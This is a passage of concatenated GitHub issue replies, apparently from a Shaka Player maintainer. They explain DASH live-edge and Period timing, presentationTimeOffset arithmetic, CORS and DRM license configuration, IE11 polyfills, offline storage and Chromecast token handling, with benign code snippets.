logic and follows the SEQ + 1 to deal with segment availability?\n\nYes and no.  Once we start streaming we will just pick the next segment.  But if we seek, we need to look up which segment to start at.  But again, we are using video.currentTime to lookup the presentation time of the segments.\n\nIf I want to reduce latency (by the cost of shorter segments and probably more rebuffers) how can I instruct a dash client (shaka) to start at my last segment ($Number)?\n\nYou can't.  After #999 we will do it by default, but there is no way to do it now.\n\nIn case of $Number templating, do we only check timing to determine the live edge? (this one I'll try to read the code too)\n\nThere is NO difference between different kinds of manifests.  You can use $Time$ or $Number$, you can use SegmentTemplate or SegmentList, it makes no difference. The only difference is how you represent the segments.  SegmentList uses an explicit list of URLs, SegmentTemplate uses a format template.  $Time$ and $Number$ is just a format specifier (like %s in printf), it doesn't affect timings in any way.\nSo this:\nxml\n<SegmentTemplate timescale=\"1\" media=\"Foo-$Number$.mp4\" initialization=\"init.mp4\">\n  <SegmentTimeline>\n    <S t=\"0\" d=\"10\"/>\n    <S d=\"10\"/>\n    <S d=\"10\"/>\n    <S d=\"10\"/>\n    <S d=\"10\"/>\n  </SegmentTimeline>\n</SegmentTemplate>\nIs exactly the same as:\nxml\n<SegmentTemplate timescale=\"1\" media=\"Foo-$Number$.mp4\" initialization=\"init.mp4\" \n    duration=\"10\" />. > First, sorry to make you go again and again in your explanation. It'd be very helpful to have such doc! A sample code (with controlled Presentation and Wall Clock timing) and diagrams can help.\nNo problem.  I'm happy to help.\n\n\nWith this example, does it means that shake will play the segment (number 2) as the live edge?\n\n\nActually we will be playing at segment 1.  I forgot we need to offset by the segment duration.  So \"right now\" is 30, but that time is still being recorded on the server.  We need to wait for the whole segment to be recorded, so we will be playing at least 10 seconds in the past.  So the real live edge will be 20.\n\n\nDoes TSB change anything in here?\n\n\nTSB only changes whether a segment is \"available\".  This can be thought of as a DVR window, you can play the last TSB seconds of a live stream.  Anything older than that isn't available, so you can't seek to it.  For example, if the TSB was 15, then in your example, we'll allow seeking in the range [5, 20].  But this moves as time goes on with the live edge, so one second later it will be [6, 21], then after one second, [7, 22].. I believe this was mostly fixed by 87c19da.  On master the first asset plays, but there is a problem with the second asset which is handled in #1232.. #1232 has been fixed, can you please retest?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. Actually we don't support that.  If a Period has audio and video, then all Periods need both.  We do not support switching between audio/video and video-only Periods.  We don't want to support these cases since it requires resetting the MediaSource, which causes choppy Period transitions.  If you look at the DashIF player it does support that, but each Period transition has a pause and a black screen while they reset everything.. @dean-river Have we answered all your questions?. This would be a really nice addition, but we can't use Blobs with MediaSource.  The appendBuffer method accepts a BufferSource, which is only an ArrayBuffer or an ArrayBufferView (i.e typed arrays).. Why?  The advantage of Blob is it is not in main memory.  If we could just tell MediaSource \"pull from this response object\", then that would be a reason to use Blobs.  But since we can't, we need to copy the blob to main memory anyway, so why not have XHR do it for us?  It would probably be more efficient for XHR to copy the data than for us to copy it.  We also sometimes need to parse the response anyway, so we would need to have a lot of extra logic to avoid reading/copying the Blob twice.  I can't think of a reason to use Blobs if we can't pass them to a browser API that uses it (e.g. MediaSource or EME).\nThe exception may be to support storage.  But I don't think we should pipe Blobs through our whole system just so we can get a little efficiency when storing content.. @DenisDashkevich #1232 has been fixed, can you please retest?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. @Jad3z Does that answer your question?  Do you need any more help?. @boredom2 Please fix the caching problems and give us a new manifest URL so we can test it.. Closing as duplicate of #1232.. Since the license server is on a different origin (server) than the Shaka demo, you'll need to add CORS headers so the browser will allow the request.  You can read more about CORS here.\nAlso note that the demo now uses a service worker for requests, which have different requirements for CORS settings.  I have seen that even with --disable-web-security the request may fail because the service worker still requires CORS.  In Chrome, you can go to the DevTools and in the \"Application\" tab select the \"Service Worker\" on the left and check the \"Bypass for network\" checkbox to see if this is CORS related.\nLastly, some browsers don't support cross-origin redirects.  See #666 for more details about this.. If you're not using http, how about writing your own scheme plugin?  You could look at the HttpXhrPlugin for an example.  For example, you could do something like:\n```js\nlet MyScheme = function(uri, request, requestType) { ... };\nshaka.net.NetworkingEngine.registerScheme('drm', MyScheme);\n```\nThen you could set the license server URL to drm://my-custom-url.. @boredom2 We support IE11 on Windows 8 and 10.  Windows 7 and below isn't supported because (I think) it doesn't expose MediaSource, which we need to play media.  We require the use of any Promise polyfill to be able to run.  The demo app does this by loading es6-promise-polyfill.  But in a custom app, you'll need to manually load any Promise polyfill on IE11.\nWe need a polyfill since IE11 doesn't implement the Promise type, which we use extensively in the library.  We used to have our own, but we decided to remove it in favor of an external one, which the app can load if they want IE11 support.  This isn't needed on any other browser since they all implement Promises.\nThis issue is about our EME polyfill, which is required to be able to play encrypted content on IE11.\n\nAlso note to everyone: you can remove the EME polyfill using a custom build configuration:\n```bash\nRemove just the IE11 polyfill:\n./build/build.py +@complete -lib/polyfill/patchedmediakeys_ms.js\nOr removing all polyfills:\n./build/build.py +@complete -@polyfill\n```\nSee ./build/build.py --help and the customizing the build tutorial for more info.. Actually you can't remove just the IE11 polyfill, the only option is to remove all the EME polyfills.  We should rewrite them so you can just remove one kind of EME polyfill.. The demo and tutorials work equally well with both Dash and HLS.  All you need to do is change the manifest URL to point to your HLS manifest.\nIn the case of HLS, there are two kinds of manifests: media playlists and master playlists.  The media playlist contains info about a specific stream; the master playlist contains references to multiple media streams that we can choose between.  We require passing in the master playlist.. There are two known browsers with native TS support: Edge and Chromecast (we don't allow Safari because playback is broken).  But we support playback of TS on all browsers through transmuxing if you include mux.js.  The demo does this already, but if you are writing your own app, you'll need to include it.\nFor example, you could add the following HTML:\nhtml\n<script src=\"https://cdn.jsdelivr.net/npm/mux.js@4.4.0/dist/mux.min.js\"></script>. First, how about I explain how Periods work in Dash.  A Period represents an independent piece of the presentation timeline.  This can be thought of as a single video (or a piece of it).  Times within a Period are relative to the Period start, so you could insert a Period before another and the times would fix themselves.  This allows you to stitch together independent videos without much effort.\nWhat this means for your case is that each Period needs to have the correct times.  The times in the media need to start at 0 within each Period.  You can use presentationTimeOffset to adjust the segment times so they start at 0.  It is important to note that the segment times in the manifest need to match those in the media.  You can't just adjust the times in the manifest because once we append the media segment, it will appear at the wrong time in the <video> element.  The presentationTimeOffset will also adjust the media times, so the media segment will appear at the correct time.\nEach Period also needs to have a duration.  This can be done by using the duration attribute on the <Period> element, or it can be done implicitly by setting the start of the Period that follows it.  Many manifests will only use the duration attribute since it makes it easier to add a new Period without having to adjust the start time of every following Period.  However, you need to set the start of the first Period or we will assume it is 0, which for live may not be what you want.  Since you set the start of every Period to 0, the first Period will have a duration of 0, which is not allowed.\nHere is an example:  With a availabilityStartTime of 2018-01-01T00:00:00Z, a Period start of PT30S, and a timescale if 1.  If a segment starts at 300 with a presentationTimeOffset of 100 that puts the time within the Period at 200 seconds.  Add the Period start and the segment will really play 230 seconds into the live stream, or a wall-clock time of 2018-01-01T00:03:50Z.\nAlso note that you need to split Periods at a segment boundary (on all streams).  So if you split a stream at 30s; the first Period needs to have at least 30 seconds of content and the first segment of the next Period must start at 0, which will align with the end of the previous Period.  If you use presentationTimeOffset to offset the segment and it starts at before 0, we won't be able to play it due to browser limitations.  We can only play segments whose period-relative start time is 0 or greater.\n\nI take care to insert periods at the same time and to name them the same to avoid Shaka Player to be lost.\n\nIf you mean every Period in the manifest has the same id and start time, that is invalid.  A Period with the same id must represent the same content.  So in a manifest update, if we see a Period with the same id, we will think it is the same as the previous update and try to merge things.  Different Periods require different ids.\n\n\nIs it correctly supported to put 0 as period.@start for all periods\n\n\nYou can't have the Period@start be 0 for all Periods, that means that every Period starts at the same time, so they will overlap (which isn't allowed).  The Period time must start at the time you want it to appear in the presentation.\n\n\nis it mandatory to put a specific dash event (I put none)\n\n\nNope, just update the manifest.  Make sure you set minumumUpdatePeriod so we will fetch the updated manifest.\n\n\nwhat does mean the assertion message Assertion failed: SegmentReferences are incorrect segment_index.js:317:5\n\n\nThis may be a bug on our part, but since you are setting all the Periods start to 0, that is likely the problem.  You can't have overlapping Periods.\n\n\nis it mandatory to have as many audio fragments as video fragments in a period? I tried to avoid it but it does not seem to change the result\n\n\nThe number of segments per Period doesn't matter and doesn't have to match.  The audio and video can have different number of segments and different Periods can have different count.  The important thing is that the amount of media content is correct.  If the Period says it has a duration of 30 seconds, then you need at least 30 seconds of media content for all streams.\n\n\nis it correctly handled, for the older or the newer period to have one empty adaptation set for a media? I tried to avoid it but it does not seem to change the result\n\n\nI am fairly sure this isn't allowed.  I think each AdaptationSet requires at least one Representation.  Each Representation requires having segment info.  So you can't have a Representation without any segments in it.\n\n\nwould it be better to have the same timescale for all representations?\n\n\nIt doesn't matter.  Usually the timescale in the manifest matches the timescale of the media.  In this case, the representations won't have the same timescale since audio and video usually use different timescales.\nHopefully this will help.  Does this answer all your questions?. Your first Period looks good.  It starts at 0, but the first audio segment starts at 4673560004160, which will be played at AST + periodStart + ((t - PTO) / timescale), which will be 2018-31-01T22:03:53Z.  The first Period contains 16 seconds of content.  You're comment says start must be 16 sec, but you didn't change the time in the XML.\nIt's important to note that there is actually little difference between a VOD and Live manifest.  The only difference is that we update Live manifests and we start playing at the \"live edge\" rather than 0.  But the timelines are actually the same.  The availabilityStartTime specifies the wall-clock time that represents 0 in the presentation timeline.  The first segment in your manifest will appear at 97365833 seconds in the presentation timeline.  When the player starts playing the live stream, it looks at now - AST and uses that to determine where to start playing.  So assuming publishTime is the time you fetched the manifest, we'll start playing at 97365887 seconds.\nNow here is the problem: even though the first Period is correct and only has 16 seconds of content, it actually goes from 0 to 97365851.4 seconds.  There is no content until 97365833 seconds, where you specify the first segment to be.  So if you want to have the second Period start after the first, you'll need to specify the start time as PT97365851.4S.\nSo lets ignore the first Period and focus on the second.  We'll have the start time be PT97365851.4S, which will put it where we want it in the presentation timeline.  Now the media segments within that Period need to start at 0.  The manifest specifies that the first segment starts at 4673560867392 / 48000, or 97365851 seconds.  Segment times are relative to the Period, so we add the Period start time to get a presentation time of 194731702.4 seconds, or over 37 months from now.\nSo we need to adjust the media times back so it appears at the correct time within the Period.  This is easily done by just setting the presentationTimeOffset value to the start time of the Period.  So that will be 97365851.4 * timescale or 4673560867200 (for audio).  This will adjust the media time to appear at 0, so when we add the Period start, will put the presentation time in the correct spot.\nIt is important to start with the exact same number of seconds when calculating PTO for each stream.  So you'll set the video stream's PTO to 97365851.4 * 24 or 2434146285.  If you simply try setting PTO to the time of the first segment, you'll get A/V desync.\nSo the correct second Period would be (with some unchanged stuff removed):\nxml\n<Period id=\"period_97365850\" start=\"PT97365851.4S\">\n    <AdaptationSet id=\"1\">\n      <SegmentTemplate\n        timescale=\"48000\"\n        presentationTimeOffset=\"4673560867200\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline>\n          <S t=\"4673560867392\" d=\"96255\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\n    </AdaptationSet>\n    <AdaptationSet id=\"2\">\n      <SegmentTemplate\n        timescale=\"25\"\n        presentationTimeOffset=\"2434146285\"\n        initialization=\"dash2-$RepresentationID$-init.mp4\"\n        media=\"dash2-$RepresentationID$-$Time$.mp4\">\n        <SegmentTimeline> \n          <S t=\"2434146285\" d=\"50\" r=\"14\" />\n        </SegmentTimeline> \n      </SegmentTemplate>\n    </AdaptationSet>\n</Period>\n\n\nWhat about period that are not complete? I understand I have to ensure the timeline begins at the same time for all tracks (audio/video/text)?\n\nEvery Period needs to be complete except for the first and last ones.  The first one can have missing segments at the beginning, but must have a start and duration.  The last Period can have a non-specified duration and you can add segments as they are being generated.\n\nI was not clear, each period has an unique id inside the MPD, but I take care that those ids remain the same between multiple manifest update.\n\nOk, that is the correct behavior.. Glad to hear you got it working.  Does this answer all your questions?. It looks like the MP4 text segment contains a trun box that contains 3 samples but there are 6 vttc boxes.  I have only looked at the spec a little, but it seems that they should be the same and we assume that they are.  If that is not the case, how are we supposed to map the vttc cue to a sample time?. So the problem is that we just parse the mdat as a box structure and then associate the vttc boxes we see with the trun.  What we should be doing is using the trun to find the samples and then parse just the sample.  Then we should treat multiple vttc in the sample as having the same time.. I don't think it needs to be configurable.  I also think we should do both.  We can still fire the emsg event once we see a box and also be polling the time and fire the timelineregionenter and timelineregionexit events when the playhead reaches the time.  This allows the app to handle the emsg boxes themselves if they want to.. TS content is only supported when we have native support (e.g. on Edge or Chromecast) or when we have mux.js loaded.  My guess is that you didn't load mux.js correctly.  Be sure to load it into the global scope (on window) and make sure it is loaded before Shaka player is.  In the demo this is done using a <script> tag; if you are loading using a module loader or having your server combine/minify things you may not be exposing it correctly. You can see if it was loaded correctly by typing window.muxjs into the developer console.\nCan you provide a link to your app so we can help debug?  You can send it privately to shaka-player-issues@google.com.. The problem is that it doesn't have a CODECS attribute.  We filter it out since we don't have a registered parser for just MP4 content (without a codec).  A fix would be to just add the CODECS.  We could try to auto-detect, but is there a way to determine if the MP4 has VTT or TTML?. First I think you put the wvtt codec on the wrong stream.  The video stream has a codecs of avc1.42e01e,wvtt, and we don't support multiplexed text+video (although we might be able to once #1266 is fixed).  I think you meant to put it on the first #EXT-X-MEDIA stream?\nThe logs show No init segment for MP4+VTT!.  We require an init segment for VTT in MP4 to get the timescale.  Looking at your content, it contains a sidx box that contains the timescale, so we could get it from that instead.. Yep, looks like a bug.  Should be easy to fix, we just need to ignore text tracks when calculating the min stream duration.. Sorry for not looking at this sooner.  Please rebase on the latest master since there have been some large-scale style changes that will cause merge conflicts.  Also you'll need to verify you meet the new style requirements like using let instead of var.  Otherwise looks good to me.  Thanks.. @chrisfillmore Are you still interested in this PR?  You'll need to rebase and make some style changes for the new style requirements.. @theodab I doubt this is related to gap jumping.  This seems like a media or platform problem.\nThe fact that the content starts at 1.5 seconds seems really weird.  I might expect it to be 0.2 seconds because of PTS/DTS confusion, but 1.5 seconds is really large.  It seems more like Edge is just rejecting the first segment we append.. Is the buffer start closer to 1.7 seconds?  I notice that the second keyframe of the video is at 1.708 seconds.  So what may be happening is we somehow remove the first frame of the video (which is the keyframe), and the browser removes until the next keyframe.. We already throw an error if we don't have a license server URL for the chosen key system, so maybe the log isn't needed.  We also need to change our code so on multi-DRM platforms we pick the one with a license server given.  I think we will still choose the first and error out if we don't have a license server for it.. You can just use the normal HTML5 methods on the video.  For example, video.play() and video.pause().  You can seek by setting the current time, video.currentTime = 123.  All the normal video methods and properties should work fine (except src).. The important pieces for this kind of a steam would be in the manifest itself.  If we're talking about DASH, I would suggest:\n\n(highly recommended) Use SegmentTemplate with duration.  This ensures that we don't need to do manifest updates to learn about future segments.  The manifest will include info about all future segments.\nIf you must use SegmentTimeline or SegmentList, set a low minimumUpdatePeriod.  The spec says 0 is valid, but we will override it with a minimum of 3 seconds between updates.  If you use SegmentTemplate with duration, set this to a high value to avoid useless network activity.\nSet a low minBufferTime.  This allows faster recovery from stalls by allowing us to start playing with less content, at the cost of a higher chance of another stall.\nUse short segment sizes.  It is common to use 2 second segments for live streams.  You could reduce that to 1 to reduce delay.  But that will only help if we don't require manifest updates.\nSet a value of suggestedPresentationDelay.  If you don't set it, we will pick a default of 1.5 times minBufferTime.  This affects the delay between the calculated live edge and the one we use.  A lower value will make us play closer to the real live edge, but we will stall more if the segments aren't available yet.\nMake sure you have a UTCTiming element for clock-sync.\n\nYou should look at the documentation of your packager to see how to set these values in your live stream.\nThe only real Player setting that would affect latency would be streaming.rebufferingGoal.  It is similar to minBufferTime, setting a smaller value will allow us to play with less content.. The reason we use a Player instance in Storage is to share the configuration and networking engine.  We  wanted to avoid requiring the app to configure both the Player and the Storage with their retry parameters, restrictions, and request filters.  We could have Storage use its own networking engine, but the app will need to register its request/response filters with Storage in addition to the Player.  But we could add a convenience method to copy the settings from the given Player so the app doesn't need to copy everything.\nAs for the configuration, maybe we should move the Storage-specific settings into a sub-section.  Like streaming, we could  have a storage group.  Then the Storage.configure method would accept the same thing as Player.  The downside is that it will be complicated to implement with reverse-compatibility.. We have no intention of implementing this.  This would require an extremely large amount of work to implement.  We can't just ignore audio, if we don't append data to the SourceBuffer, the browser will wait for the audio.  We might be able to remove the buffer, but that probably won't work well on all platforms.  Plus, it is really likely that adding a new SourceBuffer will not be supported once playback has started.  So we will likely have to reset the entire media stack (including re-appending video segments) once you unmute audio.  Plus, there will be a huge delay between unmuting the audio and hearing the audio since we will need to download the segments.\nIf you don't want to play audio, you can create a video-only manifest.  We might consider a video-only or audio-only mode; but that wouldn't be able to change once we start playback.. We'll consider it in the future.  This will likely just have to be an explicit pause() and resume() methods, we may not be able to recover from a stopped download (e.g. by closing the tab).  This is because it will be difficult or impossible to tell the difference between a download that stopped and one that is still going in another tab.\nBut we may be able to have an explicit pause method where we can store which pieces we have downloaded already.  But this will be a low priority feature since we would need to store much more info in the database and we are already having troubles with different database versions.\nNote that we can't just detect existing segments since: (a) we use unique keys so there will never be existing keys and (b) a segment that is the same as an existing one may be from another stream so we can't just reuse it.  Currently we delete segments when we delete the manifest, so if we reused the segment, that segment would disappear when we deleted the other manifest.\nAlso note that if you stop a download using storage.destroy(), then we will delete any partially downloaded content, so there is no resuming.. See #1248 for more info on DB issues.  Basically we are having troubles with database versions and upgrades.  We will need to make some major changes to the internals to allow for handling different database versions.  Since this will require more changes to database structure including possible changes to the schema itself (e.g. maybe adding a new table for pending segments), I think this should wait for that issue to be closed.. I would interpret 4.4.2.2 as indicating that NOW is moving forward all the time, independent of the fetch time.  NOW refers to the live edge, so it is moving forward as the client clock moves.\nFrom DASH IOP 4.3.2.2.2\n\n\nNOW is a time that is expressing the time on the content server as wall-clock time. All information in the MPD related to wall-clock is expressed as a reference to the time NOW. \n\n\nSo it is the current wall-clock time on the content server, not the fetch time.  This is why clock sync is important; both the client and the server need synchronized clocks so we can determine availability consistently.\nAlso from the DASH spec:\n\nA.3.4 Media Segment list restrictions\nThe Media Segment List is restricted to a list of accessible Media Segments, which may be a subset of the Media Segments of the complete Media Presentation. The construction is governed by the current value of the clock at the client NOW which is greater than or equal to the FetchTime of the MPD.. First, I think the presentationTimeOffset is wrong.  You are losing the first segment of the Period because the PTO puts it outside the Period.  It also causes a gap before the next content.  If I subtract 4096 from each presentationTimeOffset attribute, I get gap-free transitions into and out of the ad.\n\nSecond, you are reusing Period@id values.  Each Period needs to have a unique ID (or none).  If the ad Period has the same ID as one in a previous manifest, we ignore it.  Since we don't have the next Period, we extend the ad Period longer than we should, which causes the error.  If I ignore the ID, I don't get any playback errors.\nI have also occasionally seen the video stop or a black frame on seeks and the video refuses to move forward.  This appears to be a DRM problem and I will look into it more.. From what I can tell, the Period ID needs to be unique.  Section 3.2.12 of the IOP guidelines talks about the AdaptationSet IDs, not the Period IDs.  The DASH spec is pretty clear on this in section 5.3.2.2, Table 4.\n\nspecifies an identifier for this Period. The identifier shall be unique within the scope of the Media Presentation.. Not yet, but this is a duplicate of #1178.. @joeyparrish I would think there would be three distinct use cases for this setting:\n\n\nNot setting anything: Non-seekable HLS and using timeShiftBufferDepth for DASH.\nSetting availabilityWindowOverride: Using that value to indicate the time that segments remain alive for and determining the seek range.\nUsing #999: The segments that appear in the latest manifest determine the seek range.\n\nSo setting to Infinity would mean (to me) to be all segments are available forever, similar to not having a timeShiftBufferDepth in DASH.  If I am wrong, how do you see setting to Infinity being different than #999?. It seems weird that the browser would says that 0.062633 is buffered, but when we seek to it, it puts us at 0.062632.  Maybe this is a browser bug.  You may want to file a bug on Chrome.\nBut we should still not get stuck in infinite loops like this.  We can just ignore extremely small gaps since the browser should ignore them anyway.. The CORS errors are caused by a redirect.  If I just use the redirected URL directly, it works fine.  The problem I see is that there is a gap between Periods, specifically there are not enough segments in one Representation.  We support gaps between Periods, but only when the Period has an explicit duration.  We may want to detect this and handle the gap automatically.\nWhen I fetched the manifest, the first Period had an ID of 188269246292 and a start time of 1523290742.183.  The segments for the video stream end at t=\"188528165492\", which puts the presentation time at 1523293619.063.  The second Period starts at 1523293652.680, which is 33.617 seconds away.  So we can't find the segments from the end of the first Period.. Hmm, I've been playing for almost 2 hours with no problem.  Plus, I think we should actually handle the case of gaps between Periods already.  I'll look into it more.\nBut you should avoid gaps between Periods if at all possible.  Every Representation should have segments for the entire Period and each Period shouldn't have gaps between them.. Now I no longer see a manifest with two Periods in it.  When the Period transition happens, the new manifest only contains the second Period.  This isn't wrong, but it breaks our gap-jumping logic since it only works if we see the two Periods in the same manifest.  We may be able to add support for this case, but it may not be simple.  Tentatively scheduled for v2.5.\nBut there are still gaps between the Periods.  It would be ideal if you could fix them, but we can work to fix our gap-jumping logic.. For those unfamiliar with catastrophic backtracking, here is a short explanation.\nConsider the following regex: /a*a*b/\nSo if you have an input string of aaax, it obviously doesn't match.  First it tries to match the first a* with the longest string of a's (since it's greedy).  The 'x' doesn't match 'a', so it tries the next regex part; the second a* is optional, so it tries the next regex part; the 'x' doesn't match the expected 'b' so it fails to match.\nBut the * matches any number of something, so what if we chose less of them?  So the regex engine backs up and selects one fewer 'a' from the first a* and moves forward.  This time, the remaining string is 'ax', so the second a* can match the 'a'.  But the 'x' still doesn't match 'b'.\nBut what if the second a* didn't use all the a's?  See the problem?  Here is a list of all the matches the regex engine will try on the above string:\n| a | a | b|\n-----|----|-----\n| aaa | | x |\n| aa | a | x |\n| aa | | ax |\n| a | aa | x |\n|a | a | ax |\n| a | | aax |\n| | aaa | x |\n| | aa | ax |\n| | a | aax |\n| | | aaax |\nYou see there are 10 attempts to match the given string, which is really just a series of a's.  The regex /a*b/ will only make 4 matches as it tries less values for a*.  This can become exponentially worse as there are more characters in the input string.\nIn the TTML parser we use the regex /\\d*\\.?\\d*/ to match numbers.  Since the . is optional, it is similar to the above case.. First I don't think we can accept this at the moment.  We want to make some major changes to the Storage internals as part of the fix to #1248.  So I think we should wait to work on this feature until that is fixed and the changes are made.  Especially since this will involve changes to the database contents, which will need reverse-compatibility.\nSince this is a big feature, I would suggest discussing the design in #1301 first so we can all agree on the correct way to do this.  For example, I don't like storing every segment urls even if we aren't using pause/resume.. I cannot reproduce a problem.  When do you stop the player (immediately after load or a while after playback)?  Does this problem happen consistently?  Could you provide a link to your app or to a full, working snippet that reproduces your problem?  Can you try without the if checks in player_stop?  I am thinking you may not be actually calling the unload and destroy methods.\nMy repro steps:\n\nNavigate to https://shaka-player-demo.appspot.com/demo/#asset=//wowzaec2demo.streamlock.net/live/bigbuckbunny/manifest_mpm4sav_mvtime.mpd;lang=en-US;build=compiled\nOpen DevTools\nClick Load\nEnter this into JavaScript console:\njs\nshakaDemo.localPlayer_.unload(); shakaDemo.localPlayer_.destroy()\n\nI see the video stop, the poster is shown, and nothing more is downloaded.. First I see you are calling the stopPlayer method 12 times!  You may want to see why this is happening, we don't support calling anything after calling destroy, so the second call to unload may break in the future.\nSecond, I think this is a scoping problem.  I am basing this on the code right now.  Line 414 creates a player instance and attaches it to window.  Then line 431 creates a second player instance and loads the video into that.\nThen in stopPlayer, it destroys the player that is attached on window.  This is because the player_shaka variable is scoped to the initPlayer method, so it will look for a global variable with that name.  So the stopPlayer method will stop the first player, not the second player, which is what loaded the video.\nAlso I would suggest you move the JavaScript code to its own file.  This allows you to edit the JavaScript in DevTools.  It would make debugging easier.. Jasmine has expect(...).toThrow which allows us to assert that a function will throw an exception.  We should look into adding one for async methods.   There appears to be expectAsync, but I don't think it supports asserting the value of the rejection.  For example:\n```js\n// Instead of:\ntry {\n  await foo();\n  fail();\n} catch (e) {\n  expect(e).toEqual(expected);\n}\n// Instead we could add:\nawait expectAsync(foo()).toBeRejectedWith(expected);\n// Or\nawait expectAsync(foo).toRejectWhenCalled(expected);\n``. @joeyparrish I don't see it as being empty.npm install shaka-player@2.3.3` seems to have files in it.\nThe problem is that the source map contains entries like [synthetic:util/polyfill], which is caused by the compiler.  See google/closure-compiler#256 for some info.  We may want to post-process the source map to remove these, or @yairans could just ignore the warnings.. @yairans I think the problem is the compiler is adding these fake entries for code it generates for converting ES6 to ES3.  I think these warnings can be safely ignored.  Adding a post-processor would be non-trivial and prone to bugs.  I think it would be preferable to just ignore the warnings since the browser will ignore those entries.  If this is a serious concern, we can consider adding something in the future, or you could comment on the compiler bug.. We don't support changing the Period@start attribute.  Although this is allowed by both the DASH spec and the IOP, it doesn't represent a common use case and there are other ways to achieve the same thing.  We require keeping the Period@start the same throughout the presentation, but you could still change the segment list and use startNumber to indicate when segments are dropped from the manifest.. @arjen4157 Does this answer all your questions?  Can we close the issue?\n. There is no convenient API to do this, but you could query the manifest.  \n\nUse player.getVariantTracks() and find the one that has active of true; using the id property is the variant ID of what we are currently streaming.\nUse player.getManifest() to get the manifest object.\nManifest definition.\n\n\nSearch the manifest.periods[0].variants array for the one with the same ID.\nFor each audio and video streams:\nUse findSegmentPosition to find the segment index that contains the given time (in seconds)\ne.g. variant.audio.findSegmentPosition(300) may return 12\n\n\nUse getSegmentReference to get that segment reference\ne.g. variant.audio.getSegmentReference(12) will return a shaka.media.SegmentReference object.\n\n\nUse this to determine seek position.  For example, you could instead seek to segment.getStartTime(), which could be 295 in this example.\n\n\n\nThis also will be much more complicated if you have multi-Period content or if the first Period doesn't start at 0.  Also, this uses the segment info present in the manifest, which may not be the sidx box.  If you are using SegmentBase, then we use the sidx to determine the segments; but other segment formats explicitly list the segments, so we ignore any sidx boxes we see.\nAlso, for the initial start time, you can set the streaming.startAtSegmentBoundary configuration to snap the start time to a segment boundary.  But this only applies to the start time.\njs\nplayer.configure({streaming: {startAtSegmentBoundary: true}});\nplayer.load('https://example.com/manifest.mpd', 30);\n// May change start time to 25 so it is at a segment boundary.. @krvangala Does this answer all your questions?. You could use a request/response filter.  These are called for every network request.\n```js\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.SEGMENT) return;\n  // Log that segment has started downloading; record start time.\n});\nplayer.getNetworkingEngine().registerResponseFilter(function(type, response) {\n  if (type != shaka.net.NetworkingEngine.RequestType.SEGMENT) return;\n  // Log that segment has finished downloading.\n  console.log(response.data.byteLength);  // |data| is an ArrayBuffer.\n});\n```\nRequest definition and Response definition.\nTo get segment times or duration (in seconds), you would have to query the manifest like in #1344.\nIf you actually just want to log this to the console, you could use the debug build and increase the log level.  We will log (at level V1) each segment we append.\njs\nshaka.log.setLevel(shaka.log.Level.V1);. First, I believe there is no way to renew an offline license.  The only option would be to delete the old license and download a new license.  But trying to swap out the license is unsupported.  We might be able to add an API to reset the licences of a piece of content, but it would require storing the pssh data so we can make another license request later.. I'm not sure what you mean by proxy token.  Do you mean a cookie/query parameter/etc that you set in a request filter?  Or is it a query parameter on the manifest URL?  Or is it a parameter on the license server URL?\nIn general, custom license handling (e.g. using a request/response filter) requires a custom receiver app.  The default demo receiver doesn't allow you to set a filter on the Chromecast since we can't send functions over the network.  If you have custom license handling, you will probably need a custom receiver app that will register the filters on the Chromecast side.  Then you could just use your own methods of sending a message to the Chromecast containing the token (or update the token on the Chromecast itself).\nAlso note that LOAD_INTERRUPTED is not really an error.  It is returned from the first call to load() to indicate that it was interrupted; the second call to load() should succeed and playback should work.. So what you do is:\n\nStart playback locally.\nToken expires, local playback continues.\nStart casting.\nPlayback fails due to expired token.\n\nIs this correct?  I think the problem is that when we cast, we start a new playback session.  So the license request on the Chromecast fails since the token is expired.  In this case, you just need to update the license server in the Player configuration:\njs\nplayer.configure({\n  drm: {\n    servers: {\n      'com.widevine.alpha': 'https://your.server.com/proxy?token=newToken',\n    },\n  },\n});\nThis will make us use that license server from that point forward.  If you used the CastProxy version of the player, this will work on the sender and affect the Chromecast.  If you call this before casting, we will use that configuration when we start playing on the Chromecast.\n\nThis means that after loading an asset video_.paused is true which according to Shaka's documentation is how we should evaluate whether a device has autoplay capabilities or not.\n\nI don't know where you got this, but this is wrong.  video.paused can be false for a number of reasons, the main one is we don't have content yet.  The video will remain paused until there is content downloaded, even if autoplay is set.. > I made it work by updating when the user presses the cast button. The only downside I found here is that if chromecast's session is canceled from Chrome's button or for any other reason, content playback fails to resume on device. (Since the cast btn on my app has not been pressed.)\nIf you cancel casting, there is nothing on the Chromecast.  It should go back to the standby window.  If you try to cast again, it is an entirely new session and you'll need to ensure the Player is setup with the correct configurations to play the content.\nCAST_CANCELED_BY_USER means that we lost connection with the Chromecast; so if you change the configuration, it will only affect the local instance, not the Chromecast.\n\nMaybe the right approach is to update the license every time a new token is fetched instead of doing it when starting - stopping cast.\n\nThat would be the correct behavior.  If your license server URL changes, you should update the player.  Currently you don't need to update the URL since we only make one license request at the beginning; once we have the license, we don't need to make any other requests to the license server.  But you should keep the license server URL updated in case we need to make requests in the future.  For example, if your proxy changes to use renewals, we'll need to periodically renew the license, which will fail if the token is expired.. First, dash.js is implemented by the DASH IF as their reference player, so I severely doubt it implements SmoothStreaming.\nBut here are some differences:\n- dash.js is built as a reference player, we are built as a production-ready player.\n- We support complex network filters for authentication.\n- We have a plugin interface to easily add new features.\n- We support smooth multi-Period transitions.\n- We can automatically jump gaps in content.\n- We support some technically bad content that dash.js doesn't.\n- We have built-in support for storing content offline, including protected content.\n- We have built-in Chromecast support, including a proxy for the sender.\n- We actively test on 11 different browsers and platforms.  I'm not sure how cross-platform dash.js is.  We highly emphasize a consistent cross-platform streaming experience.\nWe also implement HLS.  Which you listed, but is really an important feature since you can use the same player and setup for multiple manifest types.  There are no differences between a DASH stream and an HLS stream from our API.\nAlso, here are some important features we want to add:\n- SmoothStreaming support #703.\n- src= for HLS on iOS #997.\n- Single-file playback using src= #816.\n- Fairplay support #382.\n- Playing multiple VOD clips sequentially #764.. I didn't know this, but apparently UTCTiming isn't in the DASH spec itself.  So they may be correct about it being in the draft spec.  But, it has been in the IOP guidelines (which have several finalized versions) for a while now.  Also, we focus on implementing the IOP guidelines, not really the DASH spec itself.  UTCTiming is in the finalized versions 